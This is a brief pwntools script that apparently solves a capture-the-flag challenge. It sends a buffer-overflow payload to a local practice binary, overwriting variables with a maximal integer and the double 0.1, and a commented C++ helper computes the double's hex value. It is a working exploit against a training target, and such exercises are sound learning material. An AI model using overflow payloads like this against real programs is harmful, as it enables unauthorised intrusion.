from pwn import *
import sys
context.binary = "./task_gettingStart_ktQeERc"
io = process("./task_gettingStart_ktQeERc")

if __name__ == "__main__":
    payload = flat(0, 0, 0, 0x7FFFFFFFFFFFFFFF, 0x3FB999999999999A)
# double a = 0.1 
# a = 0x3FB999999999999A
    gdb.attach(io)
    io.sendlineafter("you.\n", payload)

    io.interactive()

##include <bits/stdc++.h>
#using namespace std;
#int main(){
#double x = 0.1;
#long long n = *(long long*)&x;
#printf("%llX",n);
#}

